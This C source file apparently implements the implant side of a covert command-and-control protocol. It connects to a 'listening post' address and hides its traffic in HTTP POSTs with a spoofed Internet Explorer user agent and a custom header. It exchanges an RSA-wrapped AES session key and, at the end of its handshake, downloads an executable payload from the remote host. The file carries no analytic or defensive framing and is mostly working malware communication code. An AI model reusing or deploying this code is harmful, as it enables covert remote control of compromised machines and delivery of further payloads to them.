#include "pc_proto.h"
#include "aes.h"
#include "bignum.h"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

#ifdef _WIN32
#include <winsock2.h>
#define PC_CLOSE closesocket
#else
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#define PC_CLOSE close
#endif

static const char UA[] = "Mozilla/4.0 (compatible; MSIE 8.0; Win32)";

#define PC_VER_MAJOR 2
#define PC_VER_MINOR 3
#define PC_VER_SUB   0
#define PC_VER_BUILD 0x1f

int pc_session_init(pc_session_t *s, const char *ip, u16 port, const char *hdr)
{
    memset(s, 0, sizeof(*s));
    strncpy(s->lp_ip, ip, sizeof(s->lp_ip) - 1);
    s->lp_port = port;
    strncpy(s->hdr_name, hdr ? hdr : "TlEo", sizeof(s->hdr_name) - 1);
    s->sock = PC_INVALID_SOCK;
    s->timeout_ms = 10000;
    s->sub_msg = 0;
    return EQ_OK;
}

static int pc_sendall(pc_sock_t fd, const u8 *buf, size_t len)
{
    size_t sent = 0;
    while (sent < len) {
        int n = send(fd, (const char *)(buf + sent), (int)(len - sent), 0);
        if (n <= 0) return EQ_ERR_IO;
        sent += (size_t)n;
    }
    return EQ_OK;
}

static int pc_set_timeouts(pc_sock_t fd, u32 ms)
{
#ifdef _WIN32
    DWORD t = (DWORD)ms;
    if (setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, (const char *)&t, sizeof t) != 0) return EQ_ERR_IO;
    if (setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, (const char *)&t, sizeof t) != 0) return EQ_ERR_IO;
#else
    struct timeval tv;
    tv.tv_sec  = (time_t)(ms / 1000);
    tv.tv_usec = (suseconds_t)((ms % 1000) * 1000);
    if (setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof tv) != 0) return EQ_ERR_IO;
    if (setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof tv) != 0) return EQ_ERR_IO;
#endif
    return EQ_OK;
}

int pc_reconnect(pc_session_t *s)
{
    struct sockaddr_in a;
    if (s->sock != PC_INVALID_SOCK) PC_CLOSE(s->sock);
    s->sock = socket(AF_INET, SOCK_STREAM, 0);
    if (s->sock == PC_INVALID_SOCK) return EQ_ERR_IO;
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_port = htons(s->lp_port);
    a.sin_addr.s_addr = inet_addr(s->lp_ip);
    if (connect(s->sock, (struct sockaddr *)&a, sizeof(a)) != 0) {
        PC_CLOSE(s->sock); s->sock = PC_INVALID_SOCK; return EQ_ERR_IO;
    }
    if (pc_set_timeouts(s->sock, s->timeout_ms) != EQ_OK) {
        PC_CLOSE(s->sock); s->sock = PC_INVALID_SOCK; return EQ_ERR_IO;
    }
    s->connid = ++s->conn_counter;
    s->sub_msg = 0;
    return EQ_OK;
}

int pc_build_header(char *out, size_t cap, const pc_session_t *s, u32 body_len)
{
    int n = snprintf(out, cap,
        "POST / HTTP/1.1\r\n"
        "Referrer: http://%s/\r\n"
        "%s: 0%08x:%08x\r\n"
        "User-Agent: %s\r\n"
        "Host: %s\r\n"
        "Content-Length: %u\r\n"
        "Connection: Keep-Alive\r\n"
        "Cache-Control: no-cache\r\n"
        "\r\n",
        s->lp_ip, s->hdr_name, s->connid, s->seq, UA, s->lp_ip, body_len);
    return (n > 0 && (size_t)n < cap) ? n : EQ_ERR_ARG;
}

int pc_send(pc_session_t *s, const u8 *payload, u32 len)
{
    u8 hdr[PC_HDR_IMPLANT], ct[PC_MAX_BODY];
    char hh[320];
    u32 ct_len, pad, body_len;
    int hn, rc;

    if (len > PC_MAX_BODY - PC_BLOCK) return EQ_ERR_ARG;
    if (pc_reconnect(s) != EQ_OK) return EQ_ERR_IO;

    if (s->crypto_on) {
        aes_ctx c;
        pad = PC_BLOCK - (len % PC_BLOCK);       /* always >= 1: full block when aligned */
        ct_len = len + pad;
        memset(s->ptbuf, 0, ct_len);
        if (len) memcpy(s->ptbuf, payload, len);
        aes128_init(&c, s->session_key);
        rc = aes128_cbc_encrypt(&c, s->iv, s->ptbuf, ct_len, ct);
        if (rc != EQ_OK) return rc;
    } else {
        pad = 0; ct_len = len;
        if (len) memcpy(ct, payload, len);
    }

    eq_put_be32(hdr + 0, len);
    hdr[4] = (u8)pad;
    hdr[5] = (u8)(s->crypto_on ? 1 : 0);
    hdr[6] = hdr[7] = 0;

    body_len = PC_HDR_IMPLANT + ct_len;
    hn = pc_build_header(hh, sizeof hh, s, body_len);
    if (hn < 0) return hn;

    if ((rc = pc_sendall(s->sock, (const u8 *)hh, (size_t)hn)) != EQ_OK) return rc;
    if ((rc = pc_sendall(s->sock, hdr, sizeof hdr)) != EQ_OK) return rc;
    if (ct_len && (rc = pc_sendall(s->sock, ct, ct_len)) != EQ_OK) return rc;

    s->seq++;
    return EQ_OK;
}

static int pc_recvall(pc_sock_t fd, u8 *buf, u32 len)
{
    u32 got = 0;
    while (got < len) {
        int n = recv(fd, (char *)buf + got, (int)(len - got), 0);
        if (n <= 0) return EQ_ERR_IO;
        got += (u32)n;
    }
    return EQ_OK;
}

int pc_recv(pc_session_t *s, u8 *out, u32 cap, u32 *out_len)
{
    u8 hdr[PC_HDR_LP], tmp[PC_MAX_BODY];
    u32 clear, length2, plen;
    size_t hlen = (s->sub_msg == 0) ? PC_HDR_LP : PC_HDR_IMPLANT;
    int encr;

    if (pc_recvall(s->sock, hdr, (u32)hlen) != EQ_OK) return EQ_ERR_IO;

    if (hlen == PC_HDR_LP) {
        clear = eq_get_be32(hdr + 8);
        length2 = hdr[12];
        encr = hdr[13];
        s->lp_seq = eq_get_le32(hdr + 4);
    } else {
        clear = eq_get_be32(hdr + 0);
        length2 = hdr[4];
        encr = hdr[5];
    }

    plen = clear + length2;
    if (plen > sizeof tmp || plen > cap) return EQ_ERR_ARG;
    if (encr && (plen % PC_BLOCK)) return EQ_ERR_ARG;
    if (plen && pc_recvall(s->sock, tmp, plen) != EQ_OK) return EQ_ERR_IO;

    if (encr && s->crypto_on) {
        aes_ctx c;
        aes128_init(&c, s->session_key);
        if (aes128_cbc_decrypt(&c, s->iv, tmp, plen, out) != EQ_OK) return EQ_ERR_CRYPTO;
    } else if (plen) {
        memcpy(out, tmp, plen);
    }

    *out_len = clear;
    s->sub_msg++;
    return EQ_OK;
}

static int pc_recv_exe(pc_session_t *s, u8 *out, size_t cap, size_t *total)
{
    u8 buf[PC_MAX_BODY];
    u32 n;
    int i;
    for (i = 0; i < 4096; i++) {
        if (pc_recv(s, buf, sizeof buf, &n) != EQ_OK) return EQ_ERR_IO;
        if (n == 0) return EQ_OK;
        if (out) {
            if (*total + n > cap) return EQ_ERR_ARG;
            memcpy(out + *total, buf, n);
            *total += n;
        }
    }
    return EQ_ERR_IO;
}

static void pc_random(u8 *out, size_t len)
{
    size_t i;
    for (i = 0; i < len; i++) out[i] = (u8)(rand() & 0xff);
}

static void pc_build_hello(u8 out[PC_HELLO_LEN], const pc_session_t *s)
{
    memset(out, 0, PC_HELLO_LEN);
    out[1] = PC_VER_MAJOR;
    out[2] = PC_VER_SUB;
    out[3] = PC_VER_MINOR;
    out[4] = PC_VER_BUILD;
    memcpy(out + 8, s->session_key, 16);
    eq_put_be16(out + 34, PC_ARCH_X64);
    eq_put_be16(out + 38, PC_ARCH_X64);
    eq_put_be16(out + 42, PC_PLATFORM_WINNT);
    eq_put_be16(out + 46, PC_PLATFORM_WINNT);
}

static int pc_send_hello(pc_session_t *s, const u8 *pubkey, size_t pubkey_len)
{
    u8 hello[PC_HELLO_LEN], body[PC_RSA_LEN + 8 + 16];
    u32 modlen;
    const u8 *mod, *exp;

    if (pubkey_len < PC_PUBKEY_LEN) return EQ_ERR_ARG;
    modlen = eq_get_be32(pubkey);
    if (modlen == 0 || modlen > 256) return EQ_ERR_ARG;
    mod = pubkey + 4;
    exp = pubkey + 4 + modlen;

    pc_build_hello(hello, s);
    if (bn_modexp(body, PC_RSA_LEN, hello, PC_HELLO_LEN,
                  exp, 256, mod, modlen) != EQ_OK)
        return EQ_ERR_CRYPTO;

    memset(body + PC_RSA_LEN, 0, 8);
    memcpy(body + PC_RSA_LEN + 8, s->iv, 16);
    return pc_send(s, body, sizeof body);
}

int pc_handshake(pc_session_t *s, const u8 *pubkey, size_t pubkey_len,
                 u8 *exe_out, size_t exe_cap, size_t *exe_len)
{
    u8 buf[PC_MAX_BODY];
    u32 n;
    int status = 0;
    size_t total = 0;

    pc_random(s->session_key, 16);
    pc_random(s->iv, 16);

    while (status < 14) {
        switch (status) {
        case 0:
            if (pc_send(s, NULL, 0) != EQ_OK) return EQ_ERR_IO;
            status = 1; break;
        case 1:
            if (pc_recv(s, buf, sizeof buf, &n) != EQ_OK) return EQ_ERR_IO;
            status = 2; break;
        case 2:
            if (pc_send_hello(s, pubkey, pubkey_len) != EQ_OK) return EQ_ERR_IO;
            s->crypto_on = 1;
            status = 3; break;
        case 3:
            if (pc_recv(s, buf, sizeof buf, &n) != EQ_OK) return EQ_ERR_IO;
            status = 4; break;
        case 4:
            if (pc_send(s, (const u8 *)"\0\0\0\0", 4) != EQ_OK) return EQ_ERR_IO;
            status = 5; break;
        case 5:
            if (pc_recv(s, buf, sizeof buf, &n) != EQ_OK) return EQ_ERR_IO;
            status = (n > 0) ? 7 : 6; break;
        case 6:
            if (pc_send(s, NULL, 0) != EQ_OK) return EQ_ERR_IO;
            status = 7; break;
        case 7:
            if (pc_recv(s, buf, sizeof buf, &n) != EQ_OK) return EQ_ERR_IO;
            if (n != 4) return EQ_ERR_ARG;
            if (pc_recv(s, buf, sizeof buf, &n) != EQ_OK) return EQ_ERR_IO;
            if (n != PC_BLOB_LEN) return EQ_ERR_ARG;
            status = 8; break;
        case 8:
            if (pc_send(s, (const u8 *)"\0\0\0\0", 4) != EQ_OK) return EQ_ERR_IO;
            status = 9; break;
        case 9:
            if (pc_recv(s, buf, sizeof buf, &n) != EQ_OK) return EQ_ERR_IO;
            status = 10; break;
        case 10:
            if (pc_send(s, (const u8 *)"\0\0\0\0", 4) != EQ_OK) return EQ_ERR_IO;
            status = 11; break;
        case 11:
            if (pc_recv_exe(s, exe_out, exe_cap, &total) != EQ_OK) return EQ_ERR_IO;
            status = 14; break;
        default:
            status = 14; break;
        }
    }
    if (exe_len) *exe_len = total;
    return EQ_OK;
}

int main(int argc, char **argv) { (void)argc; (void)argv; return 0; }

